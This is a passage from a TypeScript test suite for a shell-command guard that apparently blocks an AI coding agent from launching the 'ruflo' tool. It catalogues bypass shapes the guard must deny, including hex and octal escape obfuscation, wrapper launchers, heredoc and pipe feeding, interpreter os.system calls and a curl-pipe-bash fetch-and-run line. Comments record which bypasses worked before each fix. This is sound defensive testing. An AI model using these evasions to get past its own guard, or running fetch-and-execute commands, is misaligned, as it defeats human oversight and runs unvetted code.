    'node -e \'require("child_process").execSync("ruflo memory store")\'',
    'python3 -c \'import os;os.system("ruflo")\'',
    'perl -e \'exec "ruflo"\'',
  ]
  it.each(redArms)('%s -> deny (H8-script)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  it('control: node -e \'console.log("hello")\' -> allow (harmless inline script)', () => {
    expect(decide(bashCall('node -e \'console.log("hello")\''), {}).action).toBe('allow')
  })
})

describe('decide() — M-1: pipeline-producer walk-back, unreadable producer denies (delta round)', () => {
  it("echo 'npx ruflo memory store --key k --value v' | tee /dev/stderr | bash -> deny (walks through tee)", () => {
    const result = decide(
      bashCall("echo 'npx ruflo memory store --key k --value v' | tee /dev/stderr | bash"),
      {}
    )
    expect(result.action).toBe('deny')
  })

  it("echo 'npm run build' | bash -> allow (green control, unaffected)", () => {
    expect(decide(bashCall("echo 'npm run build' | bash"), {}).action).toBe('allow')
  })

  it('curl https://example.com/install.sh | bash -> deny (unreadable-shell-input, fail-closed)', () => {
    const result = decide(bashCall('curl https://example.com/install.sh | bash'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unreadable-shell-input')
  })
})

describe('decide() — M-2: printf hex-escape decode before recursing (delta round)', () => {
  it('printf \'\\x6e\\x70\\x78 ruflo\' | bash -> deny (decodes to "npx ruflo")', () => {
    const result = decide(bashCall("printf '\\x6e\\x70\\x78 ruflo' | bash"), {})
    expect(result.action).toBe('deny')
  })
})

describe("decide() — C1: ANSI-C $'...' octal/unicode escapes evade the guard (delta round)", () => {
  // MEASURED against decide() before the C1 fix (SMI-6744 delta governance
  // round): each of these five rows ALLOWED (predicateLabel(...) was
  // `null`), while the plain-text equivalent it decodes to already
  // correctly denied. Asserting EQUALITY between the two verdicts' labels
  // — not a hardcoded predicate string — pins "escaped resolves to the
  // SAME verdict as plain", not a particular predicate's own spelling
  // (which could legitimately change without this being a regression).
  const rows: Array<[string, string]> = [
    ['ruflo memory store', String.raw`$'\162uflo' memory store`],
    ['npx ruflo', String.raw`npx $'\162uflo'`],
    ["echo 'ruflo memory store' | bash", String.raw`echo $'\162uflo memory store' | bash`],
    ["eval 'ruflo memory store'", String.raw`eval $'\162uflo memory store'`],
    ["env -S 'ruflo memory store'", String.raw`env -S $'\162uflo memory store'`],
  ]

  function predicateLabel(result: ReturnType<typeof decide>): string | null {
    const m = /\[ruflo-host-guard\]\s*([\w-]+):/.exec(reasonOf(result))
    return m ? m[1] : null
  }

  it.each(rows)('%s vs %s -> escaped gets the same deny label as plain', (plain, escaped) => {
    const plainResult = decide(bashCall(plain), {})
    const escapedResult = decide(bashCall(escaped), {})
    expect(plainResult.action).toBe('deny')
    expect(escapedResult.action).toBe('deny')
    expect(predicateLabel(escapedResult)).toBe(predicateLabel(plainResult))
  })

  // Control, NOT a red arm: `$'ruflo' memory store` carries no escape
  // sequence at all, so it was never part of this bug — MEASURED to
  // already deny (H4) before the C1 fix. Kept here (rather than folded
  // into the it.each above) so a future regression in the no-escapes fast
  // path is still caught alongside the five genuine C1 arms, without
  // misrepresenting it as one of them.
  it("control: $'ruflo' memory store -> deny (H4; no escape sequence, never part of this bug)", () => {
    const result = decide(bashCall(String.raw`$'ruflo' memory store`), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })
})

describe('decide() — A: fail-closed fall-through when argv[0] cannot be resolved (delta round)', () => {
  it('NPX=npx; $NPX ruflo memory store --key k --value v -> deny (unresolved-command, the H-7 motivating case)', () => {
    const result = decide(bashCall('NPX=npx; $NPX ruflo memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command')
  })

  it('control: V=ru; npx "${V}flo" … still allows the bare-assignment first segment (H8(ii) fires on the second)', () => {
    const result = decide(bashCall('V=ru; npx "${V}flo" memory store --key k --value v'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8:')
    expect(reasonOf(result)).not.toContain('unresolved-command')
  })

  // The "empty residual" arm, reached without any ruflo/claude-flow text at
  // all: a launcher invoked bare, with nothing left for it to wrap once its
  // own flags/positional are stripped. Not itself a ruflo-shaped attack,
  // but the exact "wrapper claimed the whole rest of argv" shape this arm
  // exists to fail closed on rather than silently allow.
  const emptyResidualArms = ['script -q /dev/null', 'sudo', 'env']
  it.each(emptyResidualArms)('%s -> deny (unresolved-command, empty residual)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command')
  })
})

describe('decide() — M-6: bare-name inversion closes unmodelled launchers (delta round)', () => {
  // 12 launcher/indirection red arms. `su -c`/`dtrace -c` deny via H4 (a
  // dedicated nested-command extraction, mirroring `script -c`); the
  // remainder close via the NEW H4b bare-name-inversion predicate (or, for
  // exec/command/timeout/chrt/xargs, via the SAME H-1/H-2 launcher-table
  // fixes already covered above -- included here again because they are
  // also literally part of this fix's own required red-arm list). SMI-6869
  // round 2: `ssh localhost ruflo memory store` now denies via H4, not
  // H4b — the ssh consumer-string extraction (round 2) now joins EVERY
  // non-flag argument after the destination and recurses it, so this shape
  // hits H4 on the recursed text before M-6's own bare-name scan ever
  // runs (measured; label changed here to match, per the SMI-6869 round 2
  // task's explicit sign-off on this exact reclassification).
  const redArms: Array<[string, string]> = [
    // 'H4:' (not bare 'H4') is deliberate here, unlike the other rows below:
    // a bare 'H4' substring-matches BOTH 'H4:' and 'H4b:' reasons, so it
    // would not have discriminated this row's round-1-to-round-2 label
    // change (H4b -> H4) at all -- caught while proving this test against
    // the round-1 (pre-round-2) tree, SMI-6598 discipline.
    ['ssh localhost ruflo memory store', 'H4:'],
    ["su -c 'ruflo memory store --key k'", 'H4'],
    // `watch` and `flock` moved from H4b (unmodelled) to 'H4:' (modelled)
    // when the launcher table gained their rows (SMI-6903 round 22, the env
    // guard's `flock -n /tmp/l cat .env` measured printing a decoy file).
    ['watch ruflo memory store --key k', 'H4:'],
    ['flock /tmp/l ruflo memory store --key k', 'H4:'],
    ['strace -f ruflo memory store --key k', 'H4b'],
    ["dtrace -c 'ruflo memory store --key k'", 'H4'],
    ['perl -e \'exec "ruflo"\'', 'H8-script'],
    ['exec -a x ruflo memory store --key k', 'H4'],
    ['command -p ruflo memory store --key k', 'H4'],
    ['timeout -k 2 5 ruflo memory store --key k', 'H4'],
    ['chrt -f 1 ruflo memory store --key k', 'H4'],
    ['xargs -I{} ruflo {}', 'H4'],
  ]
  it.each(redArms)('%s -> deny (%s)', (command, predicate) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain(predicate)
  })

  it('control: docker run --rm image ruflo memory store -> deny via H4b (unmodelled docker run + bare name)', () => {
    const result = decide(bashCall('docker run --rm image ruflo memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b')
  })

  it("accepted false positive (measured, not a gap): find . -name ruflo denies (only find's exact search argument costs anything)", () => {
    const result = decide(bashCall('find . -name ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b')
  })

  // >= 40 legitimate commands, drawn from CLAUDE.md's own command blocks
  // and scripts/*.sh conventions, that must all stay ALLOW despite a bare
  // "ruflo" token appearing past argv[0].
  const legitimateCommands = [
    'git commit -m ruflo',
    'git commit -m "ruflo"',
    'gh pr create --title ruflo',
    'gh issue create --title ruflo',
    'ls node_modules | grep ruflo',
    'grep -rn ruflo scripts/',
    'grep -r ruflo scripts/',
    'rg ruflo scripts/',
    'mkdir ruflo',
    'mkdir -p scripts/ruflo-seed',
    'rm -rf ruflo',
    'rm ruflo',
    'mv ruflo /tmp/ruflo',
    'cp ruflo /tmp/ruflo',
    'cd scripts/ruflo-seed',
    'pushd scripts/ruflo-seed',
    'popd',
    'npm view ruflo',
    'npm ls -g ruflo',
    'npm uninstall -g ruflo',
    'docker compose --profile ruflo up -d',
    'docker compose --profile ruflo down',
    'echo ruflo',
    'echo "ruflo"',
    "printf '%s' ruflo",
    "printf 'ruflo'",
    "find . -name 'ruflo*'",
    "find . -iname 'RUFLO*'",
    'timeout 300 npx vitest run x',
    'timeout 300 npm run build',
    'nice -n 10 npm run build',
    'nice -n 5 npx vitest run x',
    'find . -print0 | xargs -0 rm',
    "find . -type f -name '*.ts' | xargs wc -l",
    'cat scripts/ruflo-seed/package.json',
    'head -5 scripts/ruflo-seed/package.json',
    'tail -20 docker-compose.yml',
    'wc -l scripts/ruflo-host-guard.mjs',
    'stat scripts/ruflo-seed/package.json',
    'du -sh scripts/ruflo-seed',
    'tree scripts/ruflo-seed',
    'touch ruflo',
    'chmod +x scripts/ruflo-service-up.sh',
    'type ruflo',
    'which ruflo',
    'whereis ruflo',
    'test -f ruflo',
    'true ruflo',
    'false ruflo',
    'export ruflo=1',
    'unset ruflo',
    'chown user ruflo',
    'sort -r ruflo',
    'cut -r ruflo',
    'jq . scripts/ruflo-seed/package.json',
    'sed -n 1,5p scripts/ruflo-seed/package.json',
    'diff scripts/ruflo-seed/package.json scripts/ruflo-seed/package.json',
    'cmp scripts/ruflo-seed/package.json scripts/ruflo-seed/package.json',
    'docker exec skillsmith-ruflo-1 node /opt/ruflo-seed/node_modules/@claude-flow/cli/bin/cli.js mcp start',
  ]
  it.each(legitimateCommands)('legitimate command still allows: %s', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

// SMI-6869 Fix A: `<`/`>`/`&>` were plain word characters, and `&` was
// always a job-control operator, before this fix — so a redirect glued
// directly onto `ruflo`/a runner hid the name inside one opaque token no
// H-predicate ever split apart (bypass), while a digit-prefixed redirect
// like `2>&1` split into a leftover `2>` word plus a stray `1` word that
// `checkUnresolvedCommand`'s all-digit arm then denied on (false
// positive). See scripts/lib/shell-command-tokenize.mjs's own
// `readRedirectOperator` for the tokenizer-level fix these verdicts rest
// on, and shell-command-normalize.test.ts's own SMI-6869 Fix A block for
// the token-shape-level tests.
describe('decide() — SMI-6869 Fix A: redirect operators are not word boundaries', () => {
  const bypassArms: Array<[string, string]> = [
    ['ruflo>/dev/null memory store', 'H4'],
    ['ruflo>>/tmp/o memory store', 'H4'],
    ['ruflo</dev/null memory store', 'H4'],
    ['npx ruflo>/dev/null', 'H5'],
    ['bash<<<"ruflo memory store"', 'H4'],
  ]
  it.each(bypassArms)(
    '%s -> deny (%s) (bypass under the pre-fix tokenizer: the glued redirect hid the name)',
    (command, predicate) => {
      const result = decide(bashCall(command), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain(predicate)
    }
  )

  // The bypass rows above must get the SAME predicate label as their
  // plain, unredirected spelling — not a hard-coded string repeated at
  // each call site, so a future change to which predicate closes a given
  // shape cannot silently drift the two apart.
  const labelParityPairs: Array<[string, string]> = [
    ['ruflo>/dev/null memory store', 'ruflo memory store'],
    ['ruflo>>/tmp/o memory store', 'ruflo memory store'],
    ['ruflo</dev/null memory store', 'ruflo memory store'],
    ['npx ruflo>/dev/null', 'npx ruflo'],
    ['bash<<<"ruflo memory store"', 'bash <<< "ruflo memory store"'],
  ]
  it.each(labelParityPairs)(
    '%s gets the same predicate label as its plain/spaced spelling %s',
    (glued, plain) => {
      const gluedResult = decide(bashCall(glued), {})
      const plainResult = decide(bashCall(plain), {})
      expect(gluedResult.action).toBe('deny')
      expect(plainResult.action).toBe('deny')
      const gluedLabel = /\[ruflo-host-guard\] (\S+):/.exec(reasonOf(gluedResult))?.[1]
      const plainLabel = /\[ruflo-host-guard\] (\S+):/.exec(reasonOf(plainResult))?.[1]
      expect(gluedLabel).toBeDefined()
      expect(gluedLabel).toBe(plainLabel)
    }
  )

  const falsePositiveArms = [
    'gh pr checks 2957 2>&1 | sort',
    'docker stop x 2>&1',
    'git push -u origin fix/x > /tmp/o 2>&1; rc=$?',
    'echo warn >&2',
  ]
  it.each(falsePositiveArms)(
    '%s -> allow (false positive under the pre-fix tokenizer: 2>&1/> ... 2>&1 was misparsed into a stray argv element)',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('allow')
    }
  )

  it('control: ruflo 2>/dev/null memory store -> deny (H4, already correct pre-fix, unaffected)', () => {
    const result = decide(bashCall('ruflo 2>/dev/null memory store'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
  })

  const controlsAllow = ['ls &> /tmp/o', 'ls 2>/dev/null', 'sleep 5 & wait', 'ls |& cat']
  it.each(controlsAllow)(
    'control: %s -> allow (already correct pre-fix, unaffected)',
    (command) => {
      expect(decide(bashCall(command), {}).action).toBe('allow')
    }
  )
})

// SMI-6869 Fix B: the tokenizer had no heredoc state — a `<<`/`<<-` body's
// own lines tokenized as separate, ordinary command-line segments. This
// let a line-initial backtick inside the body reach the guard as a
// command substitution to evaluate (a false-positive denial on a QUOTED
// heredog, whose body a real shell never substitutes at all), and
// separately meant a heredoc directly or indirectly feeding a bare shell
// (`bash <<'EOF' ... EOF`, `cat <<'EOF' | bash`) was never recognized as
// shell-fed text at all (a bypass).
describe('decide() — SMI-6869 Fix B: heredoc bodies are not tokenised as command lines', () => {
  it('a QUOTED heredoc redirected to /dev/null, whose body text happens to start a line with a backtick, is data -> allow (the shell substitutes nothing in a quoted heredoc)', () => {
    const command =
      "cat <<'EOF' > /dev/null\n" +
      '`readManifestState` classifies into ok / missing / corrupt / unreadable /\n' +
      'version_unsupported. The union carries a manifest ONLY on ok and missing.\n' +
      'EOF\necho done'
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // MEASURED (SMI-6598 discipline): this one does NOT fail against the
  // unfixed guard — under the pre-fix tokenizer, the heredoc body's own
  // "ruflo memory store" line surfaces as its OWN independent top-level
  // segment (the very bug Fix B closes) and denies via H4 for that
  // unrelated, accidental reason. Kept as a control pinning the CORRECT
  // mechanism/label post-fix (genuine shell-fed recognition via the
  // heredoc directly redirected onto bash's own stdin), not a bypass this
  // test proves closed.
  it("control: bash <<'EOF' ... EOF (a heredoc redirected directly onto a bare shell's own stdin) -> deny via the shell-fed path (H4), not unresolved-command", () => {
    const command = "bash <<'EOF'\nruflo memory store\nEOF"
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
    expect(reasonOf(result)).not.toContain('unresolved-command')
  })

  // MEASURED: also does not fail against the unfixed guard, same reason as
  // the control directly above (the body line independently denies as its
  // own accidental top-level segment pre-fix). Control, not a red arm.
  it("control: cat <<'EOF' | bash with a ruflo body -> deny (the heredoc is relayed through cat's stdout into the pipe)", () => {
    const command = "cat <<'EOF' | bash\nruflo memory store\nEOF"
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  // MEASURED: also does not fail against the unfixed guard — the
  // tokenizer's own `$(...)`/backtick substitution recognition is
  // unconditional (pre-dates this fix entirely), so the embedded `$(ruflo
  // memory store)` was already recursed into as a real command regardless
  // of heredoc-awareness. Control, not a red arm.
  it('control: cat <<EOF with an UNQUOTED $(ruflo memory store) body -> deny (the invoking shell expands $(...) while assembling the heredoc, regardless of which command consumes it)', () => {
    const command = 'cat <<EOF\n$(ruflo memory store)\nEOF'
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  it("cat <<'EOF' with the SAME body but a QUOTED delimiter -> allow (quoted heredocs disable substitution entirely, so nothing executes)", () => {
    const command = "cat <<'EOF'\n$(ruflo memory store)\nEOF"
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it('cat <<EOF with a bare, unquoted "ruflo memory store" body and no pipe -> allow: it is DATA handed to cat, never executed by anything', () => {
    const command = 'cat <<EOF\nruflo memory store\nEOF'
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  it('git commit -F - <<\'EOF\' with "npx ruflo" inside the commit message body -> allow (git never executes its own commit message text, and the heredoc is quoted — nothing about this shape is code)', () => {
    const command =
      "git commit -F - <<'EOF'\nMentions the npx ruflo workaround discussed in review\nEOF"
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

// Governance-round C1 fix (post-PR-#2959 retro, regression): the shell-fed
// arm's final `else` (a BARE shell fed real shell text via a heredoc,
// here-string, process substitution, or pipe, with NO `-c`) used to
// unconditionally `return evaluateGuardCommand(shellFedResult.text, ...)`,
// so a BENIGN fed body (`echo hi`/`true`) returned `null` (allow) and that
// `null` propagated straight out of `evaluateGuardSegment`, skipping every
// check below it -- including the ones that already deny the segment's OWN
// argv (`bash ruflo` -> H4b, `bash node_modules/.bin/ruflo` -> H3) with NO
// fed text at all. Governance round 8 Minor 3 confirmed by mutation that
// this arm's body had become byte-identical to the heredoc-consumer arm's
// own (0 of 1,263 verdicts changed when the flag distinguishing them was
// deleted) and collapsed both into ONE `else`: only a POSITIVE verdict from
// the fed body returns early, uniformly.
describe('decide() — SMI-6869 governance round C1: benign shell-fed body no longer launders a dangerous operand (regression)', () => {
  const shellVariants: Array<[string, string]> = [
    ['bash', "bash node_modules/.bin/ruflo <<'EOF'\ntrue\nEOF"],
    ['sh', "sh node_modules/.bin/ruflo <<'EOF'\ntrue\nEOF"],
    ['zsh', "zsh node_modules/.bin/ruflo <<'EOF'\ntrue\nEOF"],
    ['dash', "dash node_modules/.bin/ruflo <<'EOF'\ntrue\nEOF"],
    ['ksh', "ksh node_modules/.bin/ruflo <<'EOF'\ntrue\nEOF"],
  ]
  for (const [shell, command] of shellVariants) {
    it(`${shell} node_modules/.bin/ruflo <<'EOF' with a benign body denies via H3 — the operand still spells a ruflo path even though the fed body is clean`, () => {
      const result = decide(bashCall(command), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain('H3:')
    })
  }

  it("bash ruflo <<'EOF' with a benign body denies via H4b — the bare-name operand, not the heredoc body, is what H4b closes", () => {
    const result = decide(bashCall("bash ruflo <<'EOF'\necho hi\nEOF"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b:')
  })

  it("bash -s ruflo <<'EOF' with a benign body denies via H4b", () => {
    const result = decide(bashCall("bash -s ruflo <<'EOF'\ntrue\nEOF"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b:')
  })

  it('echo true | bash node_modules/.bin/ruflo (pipe, benign producer) denies via H3', () => {
    const result = decide(bashCall('echo true | bash node_modules/.bin/ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it("printf 'true' | bash node_modules/.bin/ruflo (printf pipe) denies via H3", () => {
    const result = decide(bashCall("printf 'true' | bash node_modules/.bin/ruflo"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it("cat <<'EOF' | bash node_modules/.bin/ruflo (cat-heredoc pipe) denies via H3", () => {
    const command = "cat <<'EOF' | bash node_modules/.bin/ruflo\ntrue\nEOF"
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it("bash node_modules/.bin/ruflo <<< 'true' (spaced here-string) denies via H3", () => {
    const result = decide(bashCall("bash node_modules/.bin/ruflo <<< 'true'"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it("bash node_modules/.bin/ruflo <<<'true' (glued here-string) denies via H3", () => {
    const result = decide(bashCall("bash node_modules/.bin/ruflo <<<'true'"), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it('bash node_modules/.bin/ruflo <(echo true) (process substitution) denies via H3', () => {
    const result = decide(bashCall('bash node_modules/.bin/ruflo <(echo true)'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it('echo true | bash ruflo (pipe, bare-name variant) denies via H4b', () => {
    const result = decide(bashCall('echo true | bash ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4b:')
  })

  it('control: bash node_modules/.bin/ruflo with NO fed text at all still denies via H3 — unaffected by the fix, on both trees', () => {
    const result = decide(bashCall('bash node_modules/.bin/ruflo'), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H3:')
  })

  it("control: bash <<'EOF' with a benign shell AND a benign body (no ruflo anywhere) still allows", () => {
    expect(decide(bashCall("bash <<'EOF'\necho hi\nEOF"), {}).action).toBe('allow')
  })

  it('control: echo true | bash (benign producer into a bare shell, no ruflo anywhere) still allows', () => {
    expect(decide(bashCall('echo true | bash'), {}).action).toBe('allow')
  })
})

// SMI-6869 Fix C: `evaluateGuardCommand`'s H-8 recursion re-tokenizes
// inline interpreter SCRIPT TEXT (not a shell command line) through this
// guard's own shell-shaped pipeline. Program syntax this guard's tokenizer
// happens to treat as command-splitting punctuation (here, `(`/`)`
// isolating a lone numeric argument, e.g. `padEnd(15)`) could trip arms
// that presume the text IS a shell command line — "embedded" mode turns
// those three arms off for exactly this one recursion site.
describe('decide() — SMI-6869 Fix C: embedded inline-script evaluation skips shell-command-line-only arms', () => {
  it('a multi-line node -e script whose own JS syntax (padEnd(15)) would trip the all-digit unresolved-command arm under naive re-evaluation -> allow', () => {
    const command =
      "node -e 'const cases = { a: 1 };\n" +
      'for (const [name, v] of Object.entries(cases)) {\n' +
      '  console.log(name.padEnd(15), JSON.stringify({ ...v }));\n' +
      "}'"
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // MEASURED: does not fail against the unfixed guard — H8-script's own
  // `INLINE_SCRIPT_BARE_NAME_RE` scan denies this BEFORE the embedded-mode
  // recursion is ever reached (the quoted "npx ruflo memory store" string
  // matches its quote-delimited-run alternative directly), so embedded
  // mode's own arm-gating is not what closes this one. Control, not a red
  // arm for Fix C specifically — kept because the task's own case table
  // names it and because it is a genuine regression pin either way.
  it('control: node -e with a nested require("child_process").exec("npx ruflo memory store") -> deny (H8-script, before embedded-mode recursion is reached)', () => {
    const command = 'node -e \'require("child_process").exec("npx ruflo memory store")\''
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  // MEASURED: same reason as directly above (H8-script fires first).
  it('control: python3 -c with os.system("ruflo memory store") -> deny (H8-script, before embedded-mode recursion is reached)', () => {
    const command = `python3 -c 'import os; os.system("ruflo memory store")'`
    expect(decide(bashCall(command), {}).action).toBe('deny')
  })

  // Correction round: the ORIGINAL Fix C left the `$`-in-head arm of
  // checkUnresolvedCommand active even when embedded — a bare `$` inside a
  // JS string literal is not a shell expansion, so re-tokenizing this
  // script's own text split `$SP/probe-final.out,utf8` off as a fake
  // "unresolved command" head and denied a script that never mentions
  // ruflo at all. MEASURED to deny (unresolved-command, matched on
  // `$SP/probe-final.out,utf8`) before this correction.
  it('a node -e script whose text contains a literal $ inside a string (readFileSync path) -> allow (not a shell expansion)', () => {
    const command =
      "node -e \"const L=require('fs').readFileSync('$SP/probe-final.out','utf8').split('\\n');console.log(L.length)\""
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // Control: the SAME $-in-head arm must stay active on a REAL shell
  // command line (not embedded) — MEASURED first: denies via
  // unresolved-command, matched on `$X` (the assigned value "echo" is not
  // ruflo-shaped, so H8(i) never fires on the `X=echo` segment, isolating
  // this arm specifically).
  it('control: X=echo; $X memory store -> still denies via unresolved-command (matched on $X) on a real shell line', () => {
    const command = 'X=echo; $X memory store'
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('unresolved-command')
  })
})

// SMI-6869: measured against a peer's report that these three deny under
// the CURRENT (pre-fix) guard. MEASURED RESULT (SMI-6598 discipline): all
// three already ALLOW under the unfixed guard too — none of them is a red
// arm, and the peer's report does not reproduce. Recorded here as the
// correct, verified behavior (and in the task's own report) rather than
// silently dropped.
describe('decide() — SMI-6869: read-only gh/pooler-psql.sh commands stay allowed', () => {
  const commands = [
    'gh workflow run indexer-backfill.yml --help',
    'gh run view 36462245848 --json status,conclusion,updatedAt',
    './scripts/pooler-psql.sh --help',
  ]
  it.each(commands)('%s -> allow', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

// SMI-6869 Fix D: the H5 arm (checkH1toH7) denies ANY RUNNER_TOKEN_RE-
// shaped token appearing anywhere after a runner basename, with no notion
// that npm's own SUBCOMMAND determines whether that token is ever
// executed — `npm ls ruflo`/`npm view ruflo`/etc. only ever query
// metadata, never spawn the named package as a process, unlike `npm
// exec`/`npm x`/a bare `npx`. MEASURED (SMI-6598 discipline) against the
// pre-Fix-D guard before writing `isReadOnlyNpmForm`: every read-only-arm
// row below denied via H5; every executing-form control below already
// denied via H5 too (same label, unaffected by this fix); `npm ls -g
// ruflo` and `npm uninstall -g ruflo --dry-run` already allowed (pre-
// existing Stage 1 `isSanctionedNpmForm` exact forms, unaffected).
describe('decide() — SMI-6869 Fix D: read-only npm subcommands with a package-name argument allow', () => {
  const redArms = [
    'npm ls ruflo',
    'npm view ruflo version',
    'npm explain ruflo',
    'npm ls --depth=0 ruflo',
    'npm list ruflo',
    'npm ll ruflo',
    'npm la ruflo',
    'npm info ruflo',
    'npm show ruflo',
    'npm why ruflo',
    'npm outdated ruflo',
    'npm search ruflo',
    'npm config get ruflo',
  ]
  it.each(redArms)('%s -> allow (H5 denied this before Fix D)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })

  // Control: already allowed pre-fix via Stage 1's own exact-form
  // allowlist (isSanctionedNpmForm), not via this fix — kept alongside the
  // red arms above since it is the same read-only-subcommand family.
  it('control: npm ls -g ruflo -> allow (pre-existing Stage 1 sanctioned form, unaffected)', () => {
    expect(decide(bashCall('npm ls -g ruflo'), {}).action).toBe('allow')
  })

  // Executing forms must keep denying, with the SAME label measured
  // against the pre-Fix-D guard (H5) — not a hard-coded string repeated
  // at each call site, so a future change to which predicate closes a
  // given shape cannot silently drift the assertion apart from reality.
  const executingForms = [
    'npm exec ruflo',
    'npm x ruflo',
    'npm exec -- ruflo',
    'npx ruflo',
    'npm run ruflo',
  ]
  it.each(executingForms)(
    'control: %s -> still denies, label unchanged from pre-Fix-D (H5)',
    (command) => {
      const result = decide(bashCall(command), {})
      expect(result.action).toBe('deny')
      expect(reasonOf(result)).toContain('H5')
    }
  )

  // Control: already allowed pre-fix, unrelated to this fix (Stage 1's
  // own `--dry-run` allowance on the uninstall form).
  it('control: npm uninstall -g ruflo --dry-run -> allow (pre-existing Stage 1 sanctioned form, unaffected)', () => {
    expect(decide(bashCall('npm uninstall -g ruflo --dry-run'), {}).action).toBe('allow')
  })
})

// SMI-6869 governance round C1 (bypass, regression): a space-separated
// redirect target (`> ls`, `2> cat`, …) was left an ordinary, untagged
// word by the ORIGINAL Fix A, so it became argv[0] of the "residual"
// command once the redirect token itself was excluded — `ls`/`cat`/etc.
// sit on `NON_EXECUTING_VERBS`, so `checkBareNameInversion` exempted the
// whole segment. MEASURED: every row below denies with the SAME label
// (H4) as the plain, unredirected spelling `ruflo memory store`.
describe('decide() — SMI-6869 governance round C1: space-separated redirect target was an untagged bypass (regression)', () => {
  const redArms = [
    '> ls ruflo memory store',
    '2> cat ruflo memory store',
    '> grep ruflo memory store',
    '> rm ruflo memory store',
    '> echo ruflo memory store',
    '>> mv ruflo memory store',
    '< test ruflo memory store',
    '&> which ruflo memory store',
  ]
  it.each(redArms)('%s -> deny (H4, same label as the plain spelling)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H4:')
    const plain = decide(bashCall('ruflo memory store'), {})
    const label = /\[ruflo-host-guard\] (\S+):/.exec(reasonOf(result))?.[1]
    const plainLabel = /\[ruflo-host-guard\] (\S+):/.exec(reasonOf(plain))?.[1]
    expect(label).toBe(plainLabel)
  })
})

// SMI-6869 governance round C2 (bypass, regression): an interpreter
// reading its own PROGRAM from stdin (a heredoc directly on the
// interpreter, or piped into it) was never recognized as shell-fed text
// at all before this round — `findShellFedLiteralText` only ever checked
// `SHELL_COMMANDS` (bash/sh/zsh/…), never `isInlineInterpreterBasename`
// (python/node/perl/ruby/php/bun). MEASURED: all nine deny rows below
// close via H8-script (the quoted `"ruflo"` text matches
// `INLINE_SCRIPT_BARE_NAME_RE` directly, before the embedded recursion is
// even needed); all four controls stay allow (harmless program text with
// no ruflo reference, read from a heredoc or a pipe).
describe('decide() — SMI-6869 governance round C2: interpreter reading its program from stdin (bypass, regression)', () => {
  const redArms = [
    'python3 <<EOF\nimport os\nos.system("ruflo")\nEOF',
    'node <<EOF\nrequire("child_process").execSync("ruflo")\nEOF',
    'perl <<EOF\nsystem("ruflo")\nEOF',
    'ruby <<EOF\nsystem("ruflo")\nEOF',
    'php <<EOF\nexec("ruflo");\nEOF',
    'echo \'os.system("ruflo")\' | python3',
    'cat <<EOF | python3\nos.system("ruflo")\nEOF',
    'python3 - <<EOF\nos.system("ruflo")\nEOF',
    'python3 <<EOF\nos.system("ruflo")\nEOF',
  ]
  it.each(redArms)('%s -> deny (H8-script)', (command) => {
    const result = decide(bashCall(command), {})
    expect(result.action).toBe('deny')
    expect(reasonOf(result)).toContain('H8-script')
  })

  const controls = [
    'python3 <<EOF\nprint(1)\nEOF',
    'node <<EOF\nconsole.log("a".padEnd(15))\nEOF',
    'echo hello | python3',
    'cat data.json | node process.js',
  ]
  it.each(controls)('control: %s -> allow (harmless interpreter stdin, unaffected)', (command) => {
    expect(decide(bashCall(command), {}).action).toBe('allow')
  })
})

// SMI-6869 governance round C3 (bypass, regression): with TWO heredocs on
// one line (`bash <<A <<B`), the OLD `.find()` in both
// `findShellFedLiteralText` and `resolveShellFedProducer` returned the
// FIRST heredoc token — but bash itself reads stdin from the LAST one.
// `ruflo` planted in the second heredoc (B) was never seen. Fixed by
// filtering ALL heredoc tokens and joining their bodies. The control
// (ruflo in A, harmless in B) was ALREADY correctly denied before this
